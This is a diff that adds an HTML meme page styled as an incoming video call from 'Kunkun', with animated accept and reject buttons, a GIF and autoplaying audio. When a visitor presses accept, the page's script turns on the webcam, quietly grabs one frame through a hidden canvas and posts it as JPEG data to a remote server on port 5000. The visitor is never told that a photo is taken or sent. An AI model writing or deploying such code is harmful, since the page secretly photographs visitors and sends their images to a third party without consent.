@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>坤坤邀请你视频通话</title>
+	</head>
+	<style type="text/css">
+		#show{
+			width:50%;
+			height:50%;
+		}
+		body,html{
+			position: relative;
+			width:100%;
+			height: 100%;
+		}
+		.img{
+			width: 100%;
+			height:100%;
+			position: absolute;
+		}
+		.btn{
+			position: absolute;
+			top:100%;
+			transform: translateY(-100%);
+			width:100%;
+			height:20%;
+			display: flex;
+			justify-content: space-around;
+			font-size:100px;
+		}
+		.reject{
+			width:250px;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height:250px;
+			border-radius: 50%;
+			background-color: red;
+		}
+		@keyframes big {
+			0%{
+				width:250px;
+				height:250px;
+			}50%{
+				width:350px;
+				height:350px;	
+			}100%{
+				width:250px;
+				height:250px;
+			}
+		}
+		.accept:hover{
+			animation:1s ease big;
+		}
+		.accept:active{
+			animation:1s ease big;
+		}
+		.reject:hover{
+			animation:1s ease big;
+		}
+		.reject:active{
+			animation:1s ease big;
+		}
+		.accept{
+			border-radius: 50%;
+			width:250px;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height:250px;
+			background-color: green;
+		}
+		.txt{
+			position: absolute;
+			top:0;
+			transform: translateY(100%);
+			width:100%;
+			height:10%;
+			font-weight:bold;
+			display: flex;
+			justify-content: space-around;
+			font-size:100px;			
+		}
+		.cover{
+			width: 100%;
+			height:100%;
+			position: absolute;
+			z-index: 9999;
+		}
+		.hid{
+			display: none;
+		}
+	</style>
+	<body>
+		<img alt="kunkun" class="hid">
+		<img class="img" src="https://www.mynameisczy.asia/my_image/basketball.gif">
+		<div class="txt">坤坤邀请你视频通话</div>
+		<video id="show"></video>
+		<audio class="audio" autoplay='autoplay' src="https://www.mynameisczy.asia/audio/坤坤.mp3"></audio>
+		<br>
+		<canvas style="display: none;" height="500" width="500" class="cvs"></canvas>
+		<div class="btn">
+			<div class="reject">拒绝</div>
+			<div class="accept">接受</div>
+		</div>
+	</body>
+	<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+	<script type="text/javascript">
+		window.onload=function(){
+			let reject=document.querySelector('.reject')
+			let accept=document.querySelector('.accept')
+			let cover=document.querySelector('.hid')
+			const show =document.getElementById("show")
+			let heart='https://www.mynameisczy.asia/my_image/坤坤比心.jpeg'
+			let nosay='https://www.mynameisczy.asia/my_image/坤坤无语.jpeg'
+			const cvs=document.querySelector('.cvs')
+			let ctx=cvs.getContext('2d')
+			let timer;
+			reject.onclick=function(){
+				cover.setAttribute('src',nosay)
+				cover.setAttribute('class','cover')
+				setTimeout(()=>{
+					alert('小黑子,接电话!!!')
+				},1000)
+			}
+			accept.onclick=function(){
+				// 判断浏览器是否support
+				if(navigator.mediaDevices.getUserMedia||navigate.getUserMedia){
+				const p=navigator.mediaDevices.getUserMedia({video:true,audio:false})
+				p.then(MediaStream=>{
+					/*
+					成功的回调会包含一个MediaStream
+						它的原型含有的属性：
+							关闭摄像头:MediaStream.getTracks()[0].stop()
+					*/
+					// 将获取到的对象给src
+					show.srcObject=MediaStream
+					// 在video的身上有两个方法：
+						// play()开始播放
+						// pause() 暂停播放
+					show.play()
+					setTimeout(()=>{
+						ctx.drawImage(show,0,0,500,500)
+						let src=cvs.toDataURL('image/jpeg')
+						let data={
+							src:src
+						}
+						let result=axios.post('https://www.mynameisczy.asia:5000/video',data)
+						result.then(e=>{
+							if(e.data.state==1){
+								cover.setAttribute('src',heart)
+								cover.setAttribute('class','cover')
+								setTimeout(()=>{
+									alert('接听成功')
+								},1000)
+							}
+						})
+					},1000)
+				}).catch(error=>{
+					alert('您将要失去和坤坤视频的机会了!')
+				})
+				}
+			}
+			
+		}
+	</script>
+</html>
